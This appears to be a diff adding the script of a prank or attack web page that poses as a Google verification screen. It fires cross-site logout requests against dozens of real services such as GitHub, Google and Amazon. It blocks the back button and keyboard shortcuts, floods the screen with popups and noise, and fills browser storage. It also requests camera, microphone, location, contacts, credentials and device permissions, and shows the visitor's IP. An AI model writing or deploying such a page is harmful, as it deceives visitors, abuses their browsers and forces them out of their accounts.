+                const el = document.createElement('div');
+                el.className = 'graham-float';
+                el.textContent = getRandomArrayEntry(geggyPasta);
+                el.style.left = (Math.random() * (window.innerWidth - 200)) + 'px';
+                el.style.top = (Math.random() * (window.innerHeight - 80)) + 'px';
+                el.style.fontSize = (1.8 + Math.random() * 2.4) + 'rem';
+                el.style.color = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                el.style.textShadow = `0 0 30px currentColor, 0 0 60px currentColor, 0 0 90px currentColor`;
+                el.style.animationDuration = (0.2 + Math.random() * 0.3) + 's';
+                document.body.appendChild(el);
+                setTimeout(() => {
+                    el.style.transition = 'opacity 0.6s, transform 0.6s';
+                    el.style.opacity = '0';
+                    el.style.transform = 'scale(2.2) rotate(30deg)';
+                    setTimeout(() => { if (el.parentNode) el.parentNode.removeChild(el); }, 700);
+                }, 1200 + Math.random() * 1000);
+            }, 200);
+        }
+
+        function clearPage() {
+            document.body.innerHTML = '';
+            document.body.style.background = 'radial-gradient(circle at center, #0a0a12, #000000)';
+            document.body.style.backgroundImage = `
+                radial-gradient(circle at 20% 30%, #ff004433, transparent 50%),
+                radial-gradient(circle at 80% 70%, #ff336633, transparent 50%),
+                radial-gradient(circle at 50% 50%, #1a1a2e, #000000)
+            `;
+            // Background flash overlay
+            const flash = document.createElement('div');
+            flash.className = 'bg-flash';
+            document.body.appendChild(flash);
+            showIP();
+            spawnGems(70);
+        }
+
+        function hideCursor() {
+            document.querySelector('html').style.cursor = 'none';
+            const glow = document.createElement('div');
+            glow.className = 'cursor-glow';
+            document.body.appendChild(glow);
+            document.addEventListener('mousemove', (e) => {
+                glow.style.left = e.clientX + 'px';
+                glow.style.top = e.clientY + 'px';
+            });
+        }
+
+        function animateUrl() {
+            const emojis = ['🐀', '🔥', '💀', '💥', '👾', '🤖', '⚡', '🌀', '☠️', '👹'];
+            setInterval(() => {
+                let s = '';
+                for (let i = 0; i < 10; i++) {
+                    s += emojis[Math.floor(Math.random() * emojis.length)];
+                }
+                window.location.hash = s;
+            }, 100);
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  BLOCK BACK BUTTON
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function blockBackButton() {
+            window.addEventListener('popstate', () => {
+                window.history.forward();
+            });
+            // Also spam history
+            setInterval(() => {
+                history.pushState(null, null, location.href);
+            }, 500);
+            window.addEventListener('popstate', () => {
+                history.pushState(null, null, location.href);
+            });
+        }
+
+        function fillHistory() {
+            for (let i = 1; i <= 67; i++) {
+                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
+            }
+            window.history.pushState({}, '', window.location.pathname);
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  SUPER LOGOUT – AGGRESSIVE VERSION
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function superLogout() {
+            function cleanup(func, el, delayCleanup) {
+                return function() {
+                    if (delayCleanup) { delayCleanup = false; return; }
+                    if (el.parentNode) el.parentNode.removeChild(el);
+                };
+            }
+
+            function get(url) {
+                return function() {
+                    var img = document.createElement("img");
+                    img.onload = cleanup(() => {}, img);
+                    img.onerror = cleanup(() => {}, img);
+                    img.className = "hidden";
+                    document.body.appendChild(img);
+                    img.src = url;
+                };
+            }
+
+            var numPostFrames = 0;
+
+            function post(url, params) {
+                params = params || {};
+                return function() {
+                    var form = document.createElement("form");
+                    var iframe = document.createElement("iframe");
+                    iframe.className = "hidden";
+                    iframe.onload = cleanup(cleanup(() => {}, form), iframe, true);
+                    iframe.onerror = cleanup(cleanup(() => {}, form), iframe, true);
+                    iframe.name = "iframe" + numPostFrames++;
+                    document.body.appendChild(iframe);
+                    form.action = url;
+                    form.method = "POST";
+                    form.target = iframe.name;
+                    for (var param in params) {
+                        if (params.hasOwnProperty(param)) {
+                            var input = document.createElement("input");
+                            input.type = "hidden";
+                            input.name = param;
+                            input.value = params[param];
+                            form.appendChild(input);
+                        }
+                    }
+                    document.body.appendChild(form);
+                    form.submit();
+                };
+            }
+
+            function and(one, two) {
+                return function() { one();
+                    two(); };
+            }
+
+            const sites = [
+                ["AOL", and(get("https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us"),
+                    get("https://api.screenname.aol.com/auth/logout?state=snslogout&r=" + Math.random())
+                )],
+                ["Amazon", get("https://www.amazon.com/gp/flex/sign-out.html?action=sign-out")],
+                ["Blogger", get("https://www.blogger.com/logout.g")],
+                ["Delicious", get("https://www.delicious.com/logout")],
+                ["DeviantART", post("https://www.deviantart.com/users/logout")],
+                ["DreamHost", get("https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout")],
+                ["Dropbox", get("https://www.dropbox.com/logout")],
+                ["eBay", get("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")],
+                ["Gandi", get("https://www.gandi.net/login/out")],
+                ["GitHub", get("https://github.com/logout")],
+                ["GMail", get("https://mail.google.com/mail/?logout")],
+                ["Google", get("https://www.google.com/accounts/Logout")],
+                ["Hulu", get("https://secure.hulu.com/logout")],
+                ["Instapaper", get("https://www.instapaper.com/user/logout")],
+                ["Linode", get("https://manager.linode.com/session/logout")],
+                ["LiveJournal", post("https://www.livejournal.com/logout.bml", { "action:killall": "1" })],
+                ["MySpace", get("https://www.myspace.com/index.cfm?fuseaction=signout")],
+                ["NetFlix", get("https://www.netflix.com/Logout")],
+                ["New York Times", get("https://www.nytimes.com/logout")],
+                ["Newegg", get("https://secure.newegg.com/NewMyAccount/AccountLogout.aspx")],
+                ["Photobucket", get("https://photobucket.com/logout")],
+                ["Skype", get("https://secure.skype.com/account/logout")],
+                ["Slashdot", get("https://slashdot.org/my/logout")],
+                ["SoundCloud", get("https://soundcloud.com/logout")],
+                ["Steam Community", get("https://steamcommunity.com/?action=doLogout")],
+                ["Steam Store", get("https://store.steampowered.com/logout/")],
+                ["ThinkGeek", get("https://www.thinkgeek.com/brain/account/login.cgi?a=lo")],
+                ["Threadless", get("https://www.threadless.com/logout")],
+                ["Tumblr", get("https://www.tumblr.com/logout")],
+                ["Vimeo", get("https://vimeo.com/log_out")],
+                ["Wikipedia", get("https://en.wikipedia.org/w/index.php?title=Special:UserLogout")],
+                ["Windows Live", get("https://login.live.com/logout.srf")],
+                ["Woot", get("https://account.woot.com/logout")],
+                ["Wordpress", get("https://wordpress.com/wp-login.php?action=logout")],
+                ["Yahoo!", get(
+                    "https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/")],
+                ["YouTube", post("https://www.youtube.com", { "action_logout": "1" })],
+            ];
+
+            sites.forEach(site => { site[1](); });
+
+            // Also try to logout of more services aggressively
+            setTimeout(() => {
+                sites.forEach(site => { site[1](); });
+            }, 3000);
+            setTimeout(() => {
+                sites.forEach(site => { site[1](); });
+            }, 7000);
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  AGGRESSIVE KEY BLOCKING
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function blockKeys() {
+            document.addEventListener('keydown', (e) => {
+                if (['Escape', 'F12', 'Tab', 'F5', 'F11', 'F1', 'F2', 'F3', 'F4', 'F6', 'F7', 'F8', 'F9', 'F10'].includes(e
+                        .key)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    for (let i = 0; i < 3; i++) setTimeout(() => createBouncingPopup(), i * 50);
+                    return false;
+                }
+                if (e.ctrlKey && ['w', 'W', 'q', 'Q', 'r', 'R', 't', 'T', 'n', 'N', 's', 'S', 'p', 'P', 'f', 'F', 'g', 'G',
+                        'h', 'H', 'j', 'J', 'k', 'K', 'l', 'L', 'u', 'U', 'i', 'I', 'o', 'O'
+                    ].includes(e.key)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    for (let i = 0; i < 3; i++) setTimeout(() => createBouncingPopup(), i * 50);
+                    return false;
+                }
+                if (e.altKey && ['F4', 'Tab', 'd', 'D', 'f', 'F', 'e', 'E'].includes(e.key)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    for (let i = 0; i < 3; i++) setTimeout(() => createBouncingPopup(), i * 50);
+                    return false;
+                }
+                if (e.metaKey && ['w', 'W', 'q', 'Q', 'r', 'R', 't', 'T', 'n', 'N'].includes(e.key)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    for (let i = 0; i < 3; i++) setTimeout(() => createBouncingPopup(), i * 50);
+                    return false;
+                }
+            }, true);
+
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                for (let i = 0; i < 5; i++) setTimeout(() => createBouncingPopup(), i * 30);
+                return false;
+            }, true);
+
+            window.onbeforeunload = (e) => {
+                e.preventDefault();
+                e.returnValue = '🐀 GEG RAT ON!';
+                return '🐀 GEG RAT ON!';
+            };
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  PERMISSION REQUESTS – AGGRESSIVE
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function requestPerms() {
+            setTimeout(() => {
+                if ('Notification' in window) {
+                    Notification.requestPermission().then(p => {
+                        if (p === 'granted') {
+                            setInterval(() => {
+                                new Notification(getRandomArrayEntry(geggyPasta), { body: `IP: ${ip} 🐀`,
+                                    icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Ccircle cx="50" cy="50" r="50" fill="%23ff0044"/%3E%3Ctext x="50" y="65" font-size="60" text-anchor="middle" fill="white"%3E🐀%3C/text%3E%3C/svg%3E' });
+                            }, 200);
+                        }
+                    });
+                }
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+                    navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true });
+                }
+                if ('requestMIDIAccess' in navigator) {
+                    navigator.requestMIDIAccess({ sysex: true }).then(midi => {
+                        const outputs = midi.outputs.values();
+                        for (let output of outputs) {
+                            setInterval(() => {
+                                for (let i = 0; i < 128; i++) {
+                                    output.send([0x90, i, 127]);
+                                    output.send([0xB0, i, Math.random() * 127]);
+                                }
+                            }, 30);
+                        }
+                    }).catch(() => {});
+                }
+                navigator.mediaDevices?.getUserMedia({ video: true, audio: true }).then(stream => {
+                    stream.getTracks().forEach(track => {});
+                }).catch(() => {});
+                navigator.mediaDevices?.getUserMedia({ video: { facingMode: 'environment' }, audio: true }).catch(
+                () => {});
+                navigator.mediaDevices?.getDisplayMedia({ video: true, audio: true }).catch(() => {});
+                if ('bluetooth' in navigator) {
+                    navigator.bluetooth?.requestDevice({
+                        acceptAllDevices: true,
+                        optionalServices: ['battery_service', 'device_information']
+                    }).catch(() => {});
+                }
+                if ('usb' in navigator) navigator.usb?.requestDevice({ filters: [] }).catch(() => {});
+                if ('serial' in navigator) navigator.serial?.requestPort().catch(() => {});
+                if ('hid' in navigator) navigator.hid?.requestDevice({ filters: [] }).catch(() => {});
+                if ('xr' in navigator) {
+                    navigator.xr?.requestSession('immersive-vr').catch(() => {});
+                    navigator.xr?.requestSession('immersive-ar').catch(() => {});
+                }
+                if ('wakeLock' in navigator) navigator.wakeLock?.request('screen').catch(() => {});
+                if ('share' in navigator) {
+                    navigator.share?.({
+                        title: getRandomArrayEntry(geggyPasta),
+                        text: `${getRandomArrayEntry(geggyPasta)} IP: ${ip}`,
+                        url: location.href
+                    }).catch(() => {});
+                }
+                if ('clipboard' in navigator) {
+                    navigator.clipboard?.writeText(`🐀 ${getRandomArrayEntry(geggyPasta)} IP: ${ip}`).catch(() => {});
+                    navigator.clipboard?.read().catch(() => {});
+                }
+                if ('storage' in navigator && 'persist' in navigator.storage) {
+                    navigator.storage.persist().catch(() => {});
+                }
+                if ('nfc' in navigator) navigator.nfc?.watch(() => {}).catch(() => {});
+                if ('presentation' in navigator) {
+                    try { new PresentationRequest(['about:blank']).start().catch(() => {}); } catch (_) {}
+                }
+                if ('contacts' in navigator) {
+                    navigator.contacts?.select(['name', 'email', 'tel'], { multiple: true }).catch(() => {});
+                }
+                if ('credentials' in navigator) {
+                    navigator.credentials?.get({ publicKey: { challenge: new Uint8Array(32), rpId: location.hostname,
+                            userVerification: 'required' } }).catch(() => {});
+                    navigator.credentials?.get({ password: true }).catch(() => {});
+                }
+                if ('payment' in window) {
+                    try {
+                        const payment = new PaymentRequest([{ supportedMethods: 'basic-card' }], { total: { label: 'GEG CARD',
+                                amount: { currency: 'USD', value: '0' } } });
+                        payment.show().catch(() => {});
+                    } catch (_) {}
+                }
+                document.documentElement.requestFullscreen?.().catch(() => {});
+                if ('locks' in navigator) {
+                    for (let i = 0; i < 20; i++) {
+                        navigator.locks?.request(`geg-lock-${i}`, () => new Promise(() => {})).catch(() => {});
+                    }
+                }
+                if ('IdleDetector' in window) {
+                    new IdleDetector().start({ threshold: 60000 }).catch(() => {});
+                }
+                if ('EyeDropper' in window) {
+                    new EyeDropper().open().catch(() => {});
+                }
+                if ('FileSystemAccess' in window || 'showDirectoryPicker' in window) {
+                    window.showDirectoryPicker?.().catch(() => {});
+                }
+                if ('queryLocalFonts' in window) {
+                    window.queryLocalFonts?.().catch(() => {});
+                }
+                if ('launchQueue' in window) {
+                    window.launchQueue?.setConsumer?.(() => {});
+                }
+                if ('getScreenDetails' in window) {
+                    window.getScreenDetails?.().catch(() => {});
+                }
+                if ('documentPictureInPicture' in window) {
+                    window.documentPictureInPicture?.requestWindow?.().catch(() => {});
+                }
+                const video = document.createElement('video');
+                video.requestPictureInPicture?.().catch(() => {});
+                if ('BarcodeDetector' in window) {
+                    try { new BarcodeDetector().detect(new ImageData(1, 1)).catch(() => {}); } catch (_) {}
+                }
+            }, 200);
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  LOCAL STORAGE / INDEXEDDB SPAM
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function spamStorage() {
+            const bigString = 'GEG_RAT_ON_' + ip + '_'.repeat(1024);
+
+            const fillLocal = () => {
+                try {
+                    for (let j = 0; j < 200; j++) {
+                        localStorage.setItem(`geg_${Date.now()}_${j}`, bigString + Math.random());
+                    }
+                } catch (_) {}
+                setTimeout(fillLocal, 10);
+            };
+
+            const fillSession = () => {
+                try {
+                    for (let j = 0; j < 200; j++) {
+                        sessionStorage.setItem(`geg_ses_${Date.now()}_${j}`, bigString + Math.random());
+                    }
+                } catch (_) {}
+                setTimeout(fillSession, 10);
+            };
+
+            fillLocal();
+            fillSession();
+
+            // IndexedDB spam
+            for (let i = 0; i < 20; i++) {
+                const dbName = 'geg_db_' + Date.now() + '_' + i;
+                const request = indexedDB.open(dbName, 1);
+                request.onupgradeneeded = (e) => {
+                    const db = e.target.result;
+                    db.createObjectStore('gegData', { keyPath: 'id', autoIncrement: true });
+                };
+                request.onsuccess = (e) => {
+                    const db = e.target.result;
+                    const fillDB = () => {
+                        try {
+                            const tx = db.transaction('gegData', 'readwrite');
+                            const store = tx.objectStore('gegData');
+                            for (let i = 0; i < 100; i++) {
+                                store.add({ data: bigString + Math.random(), ip: ip, ts: Date.now() });
+                            }
+                        } catch (_) {}
+                        setTimeout(fillDB, 20);
+                    };
+                    fillDB();
+                };
+            }
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  MAIN TRIGGER
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function triggerGeg() {
+            if (gegHappening) {
+                for (let i = 0; i < 8; i++) setTimeout(() => createBouncingPopup(), i * 40);
+                return;
+            }
+            gegHappening = true;
+
+            // Remove the verification overlay
+            const overlay = document.getElementById('verifyOverlay');
+            if (overlay) overlay.remove();
+
+            initAudio();
+            startDrone();
+
+            clearPage();
+            hideCursor();
+            animateUrl();
+            spawnFloatingGraham();
+            blockKeys();
+            requestPerms();
+            spamStorage();
+            startBounceEngine();
+
+            // Massive initial popup burst
+            for (let i = 0; i < 15; i++) {
+                setTimeout(() => createBouncingPopup(), i * 40);
+            }
+
+            // Aggressive continuous spawning
+            setInterval(() => {
+                if (gegHappening) {
+                    const alive = bouncingPopups.filter(p => p.alive);
+                    if (alive.length < MAX_POPUPS - 1) {
+                        for (let i = 0; i < 2; i++) {
+                            setTimeout(() => createBouncingPopup(), i * 30);
+                        }
+                    }
+                }
+            }, 600);
+
+            // Extra floating text spam
+            setInterval(() => {
+                if (gegHappening) {
+                    for (let j = 0; j < 3; j++) {
+                        setTimeout(() => {
+                            const el = document.createElement('div');
+                            el.className = 'graham-float';
+                            el.textContent = getRandomArrayEntry(geggyPasta);
+                            el.style.left = (Math.random() * (window.innerWidth - 200)) + 'px';
+                            el.style.top = (Math.random() * (window.innerHeight - 80)) + 'px';
+                            el.style.fontSize = (1.8 + Math.random() * 2.6) + 'rem';
+                            el.style.color = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                            el.style.textShadow = `0 0 30px currentColor, 0 0 60px currentColor, 0 0 90px currentColor`;
+                            el.style.animationDuration = (0.2 + Math.random() * 0.3) + 's';
+                            document.body.appendChild(el);
+                            setTimeout(() => {
+                                el.style.transition = 'opacity 0.5s, transform 0.5s';
+                                el.style.opacity = '0';
+                                el.style.transform = 'scale(2.5) rotate(40deg)';
+                                setTimeout(() => { if (el.parentNode) el.parentNode.removeChild(el); }, 600);
+                            }, 1000 + Math.random() * 800);
+                        }, j * 100);
+                    }
+                }
+            }, 300);
+
+            // Aggressive audio bursts
+            setInterval(() => {
+                if (gegHappening) {
+                    for (let i = 0; i < 3; i++) {
+                        setTimeout(() => {
+                            if (Math.random() < 0.5) playGlitch();
+                            if (Math.random() < 0.4) playThump();
+                            if (Math.random() < 0.3) playSqueal();
+                            if (Math.random() < 0.2) playNoise();
+                        }, i * 50);
+                    }
+                }
+            }, 150);
+
+            console.log('🐀 GEG RAT ON – MAXIMUM AGGRESSION ENGAGED');
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  INIT – FAKE VERIFY PAGE LOGIC
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        isChildWindow = window.opener && window.opener !== window;
+
+        if (isChildWindow) {
+            // Child window: self-contained chaos
+            document.body.innerHTML = '';
+            document.body.style.background = 'radial-gradient(circle at center, #0a0a12, #000000)';
+            document.body.style.backgroundImage =
+                'radial-gradient(circle at 50% 50%, #ff004433, transparent 70%), radial-gradient(circle at center, #0a0a12, #000000)';
+
+            // Show IP
+            const ipDiv = document.createElement('div');
+            ipDiv.style.cssText =
+                'position:fixed;left:50%;top:8px;z-index:999999;color:#ff0044;font-size:2.5rem;text-shadow:0 0 20px #ff0044,0 0 40px #ff0044;transform:translateX(-50%);font-weight:900;pointer-events:none;font-family:sans-serif;';
+            ipDiv.innerText = `🐀 IP: ${ip}`;
+            document.body.appendChild(ipDiv);
+
+            // Gems
+            const emojis = ['💎', '🔥', '⭐', '🌀', '💥', '👾', '🤖', '💀', '👁️', '⚡', '🐀', '☠️', '👹'];
+            for (let i = 0; i < 40; i++) {
+                const el = document.createElement('div');
+                el.style.cssText =
+                    `position:fixed;pointer-events:none;width:${40+Math.random()*40}px;height:${40+Math.random()*40}px;border-radius:50%;z-index:99999;box-shadow:0 0 30px rgba(255,0,68,0.5);display:flex;align-items:center;justify-content:center;font-size:${1.5+Math.random()*1.5}rem;top:${Math.random()*window.innerHeight}px;left:${Math.random()*window.innerWidth}px;background:radial-gradient(circle at 30% 30%, hsl(${Math.random()*360},90%,70%), hsl(${Math.random()*360},90%,40%));animation:gf 0.6s ease-in-out infinite alternate;`;
+                el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                document.body.appendChild(el);
+            }
+
+            // Inject keyframe
+            const style = document.createElement('style');
+            style.textContent =
+                '@keyframes gf{0%{transform:translateY(-10px) scale(1) rotate(0deg);}100%{transform:translateY(10px) scale(1.15) rotate(15deg);}}';
+            document.head.appendChild(style);
+
+            // Child window self-bounce
+            let vx = (Math.random() - 0.5) * 10;
+            let vy = (Math.random() - 0.5) * 10;
+            setInterval(() => {
+                try {
+                    const x = window.screenX;
+                    const y = window.screenY;
+                    const w = window.outerWidth;
+                    const h = window.outerHeight;
+                    const sw = window.screen.availWidth || 1920;
+                    const sh = window.screen.availHeight || 1080;
+                    if (x < 5) vx = Math.abs(vx);
+                    if (x + w > sw - 5) vx = -Math.abs(vx);
+                    if (y < 30) vy = Math.abs(vy);
+                    if (y + h > sh - 5) vy = -Math.abs(vy);
+                    window.moveBy(vx, vy);
+                } catch (_) {}
+            }, 15);
+
+            // Audio
+            try {
+                const actx = new(window.AudioContext || window.webkitAudioContext)();
+                const playNoise = () => {
+                    try {
+                        const dur = 0.04 + Math.random() * 0.15;
+                        const buf = actx.createBuffer(1, actx.sampleRate * dur, actx.sampleRate);
+                        const d = buf.getChannelData(0);
+                        for (let i = 0; i < d.length; i++) d[i] = (Math.random() * 2 - 1) * Math.exp(-i / (d.length *
+                            0.25));
+                        const src = actx.createBufferSource();
+                        src.buffer = buf;
+                        const gn = actx.createGain();
+                        gn.gain.setValueAtTime(0.08 + Math.random() * 0.12, actx.currentTime);
+                        gn.gain.exponentialRampToValueAtTime(0.001, actx.currentTime + dur);
+                        src.connect(gn);
+                        gn.connect(actx.destination);
+                        src.start(actx.currentTime);
+                        src.stop(actx.currentTime + dur);
+                    } catch (_) {}
+                };
+                setInterval(playNoise, 100);
+            } catch (_) {}
+
+            // Click spawns popups
+            document.addEventListener('click', () => {
+                if (gegHappening) {
+                    for (let i = 0; i < 3; i++) setTimeout(() => createBouncingPopup(), i * 30);
+                }
+            });
+
+            console.log('🐀 CHILD WINDOW – GEG RAT ON!');
+        } else {
+            // Main window – show fake Google overlay
+
+            // Mouse tracking (for popup repulsion later)
+            initMouseTracking();
+
+            // Handle verification trigger
+            function handleVerification(e) {
+                // Prevent double triggering
+                if (gegHappening) return;
+                // Show loading state on button
+                const btn = document.getElementById('verifyBtn');
+                const btnText = document.getElementById('btnText');
+                if (btn) {
+                    btn.disabled = true;
+                    btnText.textContent = 'Verifying...';
+                    const spinner = document.createElement('span');
+                    spinner.className = 'spinner';
+                    btn.insertBefore(spinner, btnText);
+                }
+                // Small delay to simulate verification, then trigger chaos
+                setTimeout(() => {
+                    getIP().then(() => {
+                        if (audioCtx && audioCtx.state === 'suspended') {
+                            audioCtx.resume().then(() => triggerGeg()).catch(() => triggerGeg());
+                        } else {
+                            triggerGeg();
+                        }
+                    }).catch(() => {
+                        ip = 'Unknown';
+                        if (audioCtx && audioCtx.state === 'suspended') {
+                            audioCtx.resume().then(() => triggerGeg()).catch(() => triggerGeg());
+                        } else {
+                            triggerGeg();
+                        }
+                    });
+                }, 400);
+            }
+
+            // Click on overlay triggers verification
+            document.getElementById('verifyOverlay').addEventListener('click', function(e) {
+                // If the click is on the button, we handle it separately to avoid double trigger.
+                // But we want any click to trigger, so we let it bubble and handle here.
+                // However, we must prevent the button from firing twice if clicked.
+                // We'll use a flag to avoid double.
+                if (!gegHappening) {
+                    handleVerification(e);
+                }
+            });
+
+            // Also handle verify button specifically but prevent double
+            document.getElementById('verifyBtn').addEventListener('click', function(e) {
+                e.stopPropagation(); // Prevent overlay click from firing again
+                if (!gegHappening) {
+                    handleVerification(e);
+                }
+            });
+
+            // Pre-warm audio on first click
+            document.addEventListener('click', () => {
+                if (!audioCtx) {
+                    audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+                }
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume().catch(() => {});
+                }
+            }, { once: true });
+
+            // Block back button & fill history (AGGRESSIVE) – but only after chaos starts?
+            // Actually, we want these to be active from the beginning to prevent escape before verification.
+            // So we call them now.
+            blockBackButton();
+            fillHistory();
+
+            // Super logout (AGGRESSIVE – runs multiple times) – also start now.
+            superLogout();
+            setTimeout(superLogout, 5000);
+            setTimeout(superLogout, 10000);
+
+            // Get IP early
+            getIP();
+
+            console.log('🐀 GEG RAT ON – AGGRESSIVE EDITION with fake Google verify');
+            console.log('💀 Click anywhere on the verification screen to unleash CHAOS!');
+        }
+    </script>
+</body>
+</html>
